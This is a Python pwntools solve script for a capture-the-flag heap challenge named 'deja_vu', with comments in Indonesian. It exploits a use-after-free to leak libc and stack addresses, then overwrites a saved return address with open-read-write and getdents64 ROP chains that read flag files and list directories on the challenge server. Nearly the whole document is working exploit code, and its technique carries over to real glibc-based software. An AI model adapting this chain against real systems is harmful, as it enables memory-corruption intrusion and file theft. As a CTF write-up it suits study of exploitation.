#!/usr/bin/env python3
from pathlib import Path
from pwn import *
import re
import sys

BASE_DIR = Path(__file__).resolve().parent
BINARY = BASE_DIR / "deja_vu"
LIBC = BASE_DIR / "libc.so.6"

context.binary = elf = ELF(str(BINARY), checksec=False)
libc = ELF(str(LIBC), checksec=False)
context.log_level = args.LOG or "info"
context.timeout = int(args.TIMEOUT or 5)

HOST = args.HOST or "chal.thjcc.org"
PORT = int(args.PORT or 9004)

# syscall x86_64
SYS_READ = 0
SYS_WRITE = 1
SYS_OPEN = 2
SYS_CLOSE = 3
SYS_EXIT = 60
SYS_GETDENTS64 = 217
SYS_OPENAT = 257
AT_FDCWD = 0xFFFFFFFFFFFFFF9C

# dari leak unsorted-bin pada libc bawaan challenge
UNSORTED_FD_OFFSET = 0x21ACE0

# gadget offset libc Ubuntu GLIBC 2.35 bawaan challenge
POP_RDX_POP_R12_RET = 0x11F327
POP_RAX_RET = 0x45EB0
SYSCALL_RET = 0x912D6

FLAG_RE = re.compile(rb"THJCC\{[^}\n\r]+\}")


def start():
    if args.REMOTE:
        return remote(HOST, PORT)

    if args.GDB:
        return gdb.debug(
            ["./run.sh"],
            cwd=str(BASE_DIR),
            gdbscript="""
set pagination off
continue
""",
        )

    return process(["./run.sh"], cwd=str(BASE_DIR))


# Jangan pakai sendlineafter("> ") di semua tempat.
# Output menu sering tersisa di buffer setelah batch subscribe/replay.
# Lebih stabil: kirim choice langsung, lalu sync ke prompt spesifik berikutnya.
def menu(io, choice):
    io.sendline(str(choice).encode())


def compose(io, slot, length, subject, body):
    assert len(body) == length, f"body length mismatch: {len(body)=}, {length=:#x}"

    menu(io, 1)
    io.recvuntil(b"slot> ")
    io.sendline(str(slot).encode())
    io.recvuntil(b"length> ")
    io.sendline(str(length).encode())
    io.recvuntil(b"subject> ")
    io.sendline(subject)
    io.recvuntil(b"body> ")
    io.send(body)
    io.recvuntil(b"composed.\n")


def discard(io, slot):
    menu(io, 2)
    io.recvuntil(b"slot> ")
    io.sendline(str(slot).encode())
    io.recvuntil(b"discarded.\n")


def subscribe(io, slot, channel):
    menu(io, 3)
    io.recvuntil(b"slot> ")
    io.sendline(str(slot).encode())
    io.recvuntil(b"channel> ")
    io.sendline(str(channel).encode())
    io.recvuntil(b"subscribed.\n")


def subscribe_many(io, slot, first, count):
    batch = b"".join(
        b"3\n" + str(slot).encode() + b"\n" + str(ch).encode() + b"\n"
        for ch in range(first, first + count)
    )
    io.send(batch)

    for _ in range(count):
        io.recvuntil(b"subscribed.\n")


def subscribe_256(io, slot, start_channel):
    # remote butuh batch biar tidak lambat
    if args.REMOTE or args.FAST:
        subscribe_many(io, slot, start_channel, 256)
    else:
        for ch in range(start_channel, start_channel + 256):
            subscribe(io, slot, ch)


def replay(io, channel, length):
    menu(io, 5)
    io.recvuntil(b"channel> ")
    io.sendline(str(channel).encode())
    return io.recvn(length)


def amend_raw(io, channel, data, wait=5):
    menu(io, 6)
    io.recvuntil(b"channel> ")
    io.sendline(str(channel).encode())
    io.recvuntil(b"body> ")
    io.send(data)
    return io.recvrepeat(wait)


def leak_libc(io):
    large = 0x500

    compose(io, 0, large, b"leak", b"A" * large)
    subscribe_256(io, 0, 0)
    discard(io, 0)

    leak = replay(io, 0, large)
    unsorted_fd = u64(leak[:8])
    log.info("unsorted fd: %#x", unsorted_fd)

    libc.address = unsorted_fd - UNSORTED_FD_OFFSET

    if libc.address & 0xFFF:
        log.warning("first leak bytes: %r", leak[:0x40])
        raise RuntimeError(f"bad libc leak: {libc.address:#x}")

    log.success("libc base: %#x", libc.address)
    return libc.address


def leak_environ(io):
    fake = bytearray(0x30)

    # fake message layout:
    # +0x20 = body pointer
    # +0x28 = body length
    fake[:13] = b"cat flag.txt\x00"
    fake[0x20:0x28] = p64(libc.sym["environ"])
    fake[0x28:0x30] = p64(8)

    log.info("reclaiming stale message chunk")
    compose(io, 1, 0x30, b"fake", bytes(fake))
    log.info("reclaimed stale message chunk")

    stack_ptr = u64(replay(io, 0, 8))
    log.success("environ -> %#x", stack_ptr)
    return stack_ptr


def prepare_second_uaf(io):
    large = 0x500

    compose(io, 2, large, b"leak2", b"C" * large)
    subscribe_256(io, 2, 256)
    discard(io, 2)


def install_fake_message(io, ptr, length):
    fake2 = bytearray(0x30)
    fake2[0x20:0x28] = p64(ptr)
    fake2[0x28:0x30] = p64(length)
    compose(io, 3, 0x30, b"fake2", bytes(fake2))


def prepare_stack_rw(io, stack_ptr):
    prepare_second_uaf(io)

    if args.LEAKSTACK:
        base_off = int(args.STACKOFF or "500", 16)
        dump_len = int(args.DUMPLEN or "900", 16)
        target = stack_ptr - base_off

        log.info("stack leak target -> %#x", target)
        log.info("stack leak len    -> %#x", dump_len)

        install_fake_message(io, target, dump_len)
        return target, dump_len

    # Dari dump stack remote-mu, saved RIP yang enak ditimpa ada di environ - 0x180.
    # Local juga cocok. Kalau berubah, jalankan: REMOTE LEAKSTACK STACKOFF=500 DUMPLEN=900
    offset = int(args.OFFSET or "180", 16)

    target = stack_ptr - offset

    # Jangan terlalu besar. 0x2000 lokal bisa crash sebelum return karena stack frame
    # yang masih dipakai ikut ketimpa. 0x1000 aman untuk chain ORW.
    write_len = int(args.WRITELEN or "1000", 16)

    log.info("stack target -> %#x", target)
    log.info("write len    -> %#x", write_len)

    install_fake_message(io, target, write_len)
    return target, write_len


def get_gadgets():
    rop = ROP(libc)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
    pop_rdx = libc.address + POP_RDX_POP_R12_RET
    pop_rax = libc.address + POP_RAX_RET
    syscall = libc.address + SYSCALL_RET
    ret = rop.find_gadget(["ret"]).address

    log.info("ret     : %#x", ret)
    log.info("pop rdi : %#x", pop_rdi)
    log.info("pop rsi : %#x", pop_rsi)
    log.info("pop rdx : %#x", pop_rdx)
    log.info("pop rax : %#x", pop_rax)
    log.info("syscall : %#x", syscall)

    return pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, ret


def prdx(pop_rdx, value):
    # pop rdx; pop r12; ret
    return [pop_rdx, value, 0]


def close_fd_chain(fd, pop_rdi, pop_rax, syscall):
    return [pop_rdi, fd, pop_rax, SYS_CLOSE, syscall]


def build_close_fds_chain(pop_rdi, pop_rax, syscall):
    chain = []
    for fd in range(3, 10):
        chain += close_fd_chain(fd, pop_rdi, pop_rax, syscall)
    return chain


def build_openat_chain(path_addr, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, flags=0):
    # openat(AT_FDCWD, path, flags, 0)
    # mode arg di r10 diabaikan selama O_CREAT tidak dipakai.
    return [
        pop_rdi, AT_FDCWD,
        pop_rsi, path_addr,
        *prdx(pop_rdx, flags),
        pop_rax, SYS_OPENAT,
        syscall,
    ]


def build_open_chain(path_addr, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, flags=0):
    if args.OPEN:
        # open(path, flags, 0)
        return [
            pop_rdi, path_addr,
            pop_rsi, flags,
            *prdx(pop_rdx, 0),
            pop_rax, SYS_OPEN,
            syscall,
        ]
    return build_openat_chain(path_addr, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, flags)


def build_orw_payload(target, write_len, file_path):
    pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, ret = get_gadgets()

    # Layout dibuat konservatif supaya tidak overlap:
    # [ROP chain][padding][path string][padding][read buffer]
    path_off = int(args.PATHOFF or "300", 16)
    data_off = int(args.DATAOFF or "600", 16)

    path = file_path.encode() + b"\x00"
    path_addr = target + path_off
    data_addr = target + data_off

    close_chain = build_close_fds_chain(pop_rdi, pop_rax, syscall)
    open_chain = build_open_chain(path_addr, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, 0)

    chain = flat(
        ret,
        close_chain,
        open_chain,

        # read(3, data_addr, 0x300)
        pop_rdi, 3,
        pop_rsi, data_addr,
        *prdx(pop_rdx, 0x300),
        pop_rax, SYS_READ,
        syscall,

        # write(1, data_addr, 0x300)
        pop_rdi, 1,
        pop_rsi, data_addr,
        *prdx(pop_rdx, 0x300),
        pop_rax, SYS_WRITE,
        syscall,

        # exit(0)
        pop_rdi, 0,
        pop_rax, SYS_EXIT,
        syscall,
    )

    if len(chain) >= path_off:
        raise RuntimeError(
            f"ROP chain too large: {len(chain):#x} >= PATHOFF {path_off:#x}. "
            f"Run with PATHOFF=400 or PATHOFF=500."
        )

    if path_off + len(path) >= data_off:
        raise RuntimeError("path overlaps data buffer; increase DATAOFF")

    if data_off + 0x300 >= write_len:
        raise RuntimeError("data buffer exceeds write len; increase WRITELEN or lower DATAOFF")

    payload = bytearray(write_len)
    payload[:len(chain)] = chain
    payload[path_off:path_off + len(path)] = path

    log.info("mode     : ORW")
    log.info("file path: %r", path[:-1])
    log.info("chain sz : %#x", len(chain))
    log.info("path off : %#x", path_off)
    log.info("data off : %#x", data_off)
    log.info("path addr: %#x", path_addr)
    log.info("data addr: %#x", data_addr)

    return bytes(payload)


def build_ls_payload(target, write_len, dir_path):
    pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, ret = get_gadgets()

    path_off = int(args.PATHOFF or "300", 16)
    data_off = int(args.DATAOFF or "600", 16)

    path = dir_path.encode() + b"\x00"
    path_addr = target + path_off
    data_addr = target + data_off

    close_chain = build_close_fds_chain(pop_rdi, pop_rax, syscall)
    open_chain = build_open_chain(path_addr, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, 0x10000)

    chain = flat(
        ret,
        close_chain,
        open_chain,

        # getdents64(3, data_addr, 0x300)
        pop_rdi, 3,
        pop_rsi, data_addr,
        *prdx(pop_rdx, 0x300),
        pop_rax, SYS_GETDENTS64,
        syscall,

        # write(1, data_addr, 0x300)
        pop_rdi, 1,
        pop_rsi, data_addr,
        *prdx(pop_rdx, 0x300),
        pop_rax, SYS_WRITE,
        syscall,

        pop_rdi, 0,
        pop_rax, SYS_EXIT,
        syscall,
    )

    if len(chain) >= path_off:
        raise RuntimeError("ROP chain too large; increase PATHOFF")

    if path_off + len(path) >= data_off:
        raise RuntimeError("path overlaps data buffer; increase DATAOFF")

    payload = bytearray(write_len)
    payload[:len(chain)] = chain
    payload[path_off:path_off + len(path)] = path

    log.info("mode    : LS")
    log.info("dir path: %r", path[:-1])

    return bytes(payload)


def parse_dirents64(data):
    names = []
    i = 0

    while i + 19 <= len(data):
        reclen = u16(data[i + 16:i + 18])
        if reclen < 19 or i + reclen > len(data):
            i += 1
            continue

        name = data[i + 19:i + reclen].split(b"\x00", 1)[0]
        if name and all(32 <= c < 127 for c in name):
            s = name.decode(errors="replace")
            if s not in names:
                names.append(s)
            i += reclen
        else:
            i += 1

    return names


def hexdump_stack(data, base_addr, libc_base):
    print("\n[stack dump]")
    print(hexdump(data, begin=base_addr))

    print("\n[possible libc pointers]")
    for off in range(0, len(data) - 8, 8):
        v = u64(data[off:off + 8])
        if libc_base <= v < libc_base + 0x300000:
            print(f"+{off:#05x} @ {base_addr + off:#x} = {v:#x}")

    print("\n[possible stack pointers]")
    for off in range(0, len(data) - 8, 8):
        v = u64(data[off:off + 8])
        if 0x7FF000000000 <= v <= 0x7FFFFFFFFFFF:
            print(f"+{off:#05x} @ {base_addr + off:#x} = {v:#x}")


def clean_output(data):
    # buang NUL padding supaya output readable
    return data.replace(b"\x00", b"")


def extract_flag(data):
    m = FLAG_RE.search(data)
    if not m:
        m = FLAG_RE.search(clean_output(data))
    return m.group(0).decode() if m else None


def exploit_once(file_path=None, ls_path=None):
    io = start()
    try:
        libc_base = leak_libc(io)
        stack_ptr = leak_environ(io)
        target, write_len = prepare_stack_rw(io, stack_ptr)

        if args.LEAKSTACK:
            dump = replay(io, 256, write_len)
            hexdump_stack(dump, target, libc_base)
            return None, dump

        if ls_path is not None:
            payload = build_ls_payload(target, write_len, ls_path)
        else:
            payload = build_orw_payload(target, write_len, file_path)

        wait = float(args.WAIT or 3)
        log.info("writing final ROP payload")
        out = amend_raw(io, 256, payload, wait=wait)
        return extract_flag(out), out

    finally:
        try:
            io.close()
        except Exception:
            pass


def default_paths():
    # ZIP lokal menaruh flag di CWD challenge, jadi remote besar kemungkinan juga begitu.
    # Jangan default ke /flag.txt saja.
    return [
        "flag.txt",
        "./flag.txt",
        "/proc/self/cwd/flag.txt",
        "/flag.txt",
        "/flag",
        "/home/ctf/flag.txt",
        "/home/ctf/flag",
        "/home/ctf/deja_vu/flag.txt",
        "/app/flag.txt",
        "/challenge/flag.txt",
    ]


def main():
    if args.LEAKSTACK:
        exploit_once(file_path="flag.txt")
        return

    if args.LS:
        dirs = (args.DIRS or args.FILE or "/proc/self/cwd,/,/home/ctf,/app,/challenge").split(",")
        for d in dirs:
            log.info("trying LS %s", d)
            flag, out = exploit_once(ls_path=d)
            print(f"\n[raw ls output for {d!r}]")
            sys.stdout.buffer.write(clean_output(out))
            sys.stdout.buffer.write(b"\n")

            names = parse_dirents64(out)
            if names:
                print("[parsed entries]")
                for name in names:
                    print(name)
        return

    if args.FILE:
        paths = [args.FILE]
    elif args.PATHS:
        paths = args.PATHS.split(",")
    else:
        paths = default_paths()

    last_out = b""
    for path in paths:
        log.info("trying file path: %s", path)
        try:
            flag, out = exploit_once(file_path=path)
            last_out = out
        except Exception as e:
            log.warning("attempt failed for %s: %s", path, e)
            continue

        cleaned = clean_output(out)
        if cleaned.strip():
            print(f"\n[output for {path!r}]")
            sys.stdout.buffer.write(cleaned)
            if not cleaned.endswith(b"\n"):
                sys.stdout.buffer.write(b"\n")

        if flag:
            print(f"\n<FLAG>{flag}</FLAG>")
            return

    print("\n[-] flag belum ke-detect dari path default.")
    if last_out:
        print("[last raw output repr]")
        print(repr(last_out[:500]))
    print("\nCoba enum directory dulu:")
    print("  python3 solve.py REMOTE LS")
    print("atau pakai path manual:")
    print("  python3 solve.py REMOTE FILE=/path/ke/flag")


if __name__ == "__main__":
    main()
